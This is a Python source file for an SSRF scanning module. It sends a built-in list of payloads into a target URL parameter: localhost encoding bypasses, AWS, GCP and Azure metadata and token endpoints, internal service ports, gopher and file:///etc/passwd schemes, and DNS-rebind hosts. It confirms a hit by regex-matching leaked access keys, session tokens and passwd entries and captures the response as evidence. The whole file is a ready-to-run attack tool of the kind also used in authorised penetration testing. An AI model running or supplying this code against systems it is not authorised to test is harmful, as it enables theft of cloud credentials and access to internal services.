"""
SSRF (Server-Side Request Forgery) scanner module.

Probes URL parameters with internal hostnames, IP variants (decimal, octal,
IPv6), cloud metadata endpoints, and alternative URI schemes. Confirms SSRF
by detecting AWS credentials, GCP metadata, internal headers, or other
internal-service response patterns in the response body or headers.
"""

import re
import httpx
from typing import Optional

PAYLOADS: dict[str, list[str]] = {
    "localhost_variants": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://0177.0.0.1/",         # octal first octet
        "http://2130706433/",          # decimal 127.0.0.1
        "http://017700000001/",        # full octal
        "http://0x7f000001/",          # hex
        "http://127.1/",               # short form
        "http://127.0.1/",
    ],
    "cloud_aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://fd00:ec2::254/latest/meta-data/",   # IPv6 IMDS
        "http://169.254.170.2/v2/credentials/",     # ECS metadata
    ],
    "cloud_gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "cloud_azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "internal_services": [
        "http://localhost:8080/",
        "http://localhost:8443/",
        "http://localhost:9200/",      # Elasticsearch
        "http://localhost:6379/",      # Redis
        "http://localhost:27017/",     # MongoDB
        "http://localhost:5432/",      # Postgres
        "http://localhost:2375/",      # Docker daemon
        "http://localhost:10255/",     # Kubernetes kubelet
        "http://kubernetes.default.svc/",
        "http://10.0.0.1/",
        "http://192.168.1.1/",
        "http://172.16.0.1/",
    ],
    "alternative_schemes": [
        "gopher://127.0.0.1:6379/_PING",
        "dict://127.0.0.1:6379/INFO",
        "sftp://127.0.0.1:22/",
        "ldap://127.0.0.1:389/",
        "ftp://127.0.0.1:21/",
        "file:///etc/passwd",
    ],
    "dns_rebind_bypass": [
        "http://localtest.me/",        # resolves to 127.0.0.1
        "http://127.0.0.1.nip.io/",
        "http://spoofed.burpcollaborator.net/",
    ],
}

# Patterns in response body that confirm internal data was returned
CONFIRM_PATTERNS: list[tuple[str, str]] = [
    (r"ami-[0-9a-f]{8,17}", "AWS AMI ID"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    (r'"AccessKeyId"\s*:', "AWS credentials JSON"),
    (r'"Token"\s*:\s*"', "AWS session token"),
    (r'"serviceAccounts"', "GCP service account metadata"),
    (r'"compute#metadata"', "GCP compute metadata"),
    (r'"instance".*"zone"', "GCP instance zone"),
    (r'"subscriptionId"', "Azure subscription metadata"),
    (r"root:x:0:0", "Linux /etc/passwd"),
    (r"X-Forwarded-For", "Internal header reflection"),
    (r"elastic|kibana", "Elasticsearch"),
    (r"\+PONG", "Redis PONG"),
    (r'"gitVersion".*"v1\."', "Kubernetes API"),
    (r"Docker-Distribution-Api-Version", "Docker registry"),
]


class SSRFModule:
    """
    Scans a URL parameter for Server-Side Request Forgery vulnerabilities.

    Usage:
        module = SSRFModule(timeout=10, verbose=True)
        finding = module.scan("https://target.com/fetch", "url")
    """

    def __init__(self, timeout: int = 10, verbose: bool = False):
        self.timeout = timeout
        self.verbose = verbose
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
        )

    def _log(self, msg: str):
        if self.verbose:
            print(f"[SSRF] {msg}")

    def _confirmed(self, body: str, headers: dict) -> Optional[tuple[str, str]]:
        """Return (pattern, description) if internal content detected, else None."""
        combined = body + " ".join(f"{k}: {v}" for k, v in headers.items())
        for pattern, description in CONFIRM_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                return pattern, description
        return None

    def _probe(self, url: str, param: str, payload: str, category: str) -> Optional[dict]:
        sep = "&" if "?" in url else "?"
        target = f"{url}{sep}{param}={payload}"
        self._log(f"Trying: {target}")
        try:
            resp = self.client.get(target)
            hit = self._confirmed(resp.text, dict(resp.headers))
            if hit:
                pattern, description = hit
                return {
                    "type": "SSRF",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "category": category,
                    "status_code": resp.status_code,
                    "matched_pattern": pattern,
                    "description": description,
                    "evidence": resp.text[:400],
                }
        except httpx.RequestError as e:
            self._log(f"Request error: {e}")
        return None

    def scan(self, url: str, param: str) -> Optional[dict]:
        """
        Scan a URL parameter for SSRF vulnerabilities.

        Args:
            url:   Target URL (e.g. https://target.com/proxy)
            param: Parameter to inject into (e.g. "url", "src", "dest")

        Returns:
            Finding dict on confirmed SSRF, None otherwise.
        """
        self._log(f"Scanning {url} param={param}")
        for category, payloads in PAYLOADS.items():
            self._log(f"Testing category: {category}")
            for payload in payloads:
                finding = self._probe(url, param, payload, category)
                if finding:
                    return finding
        return None

    def close(self):
        self.client.close()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()
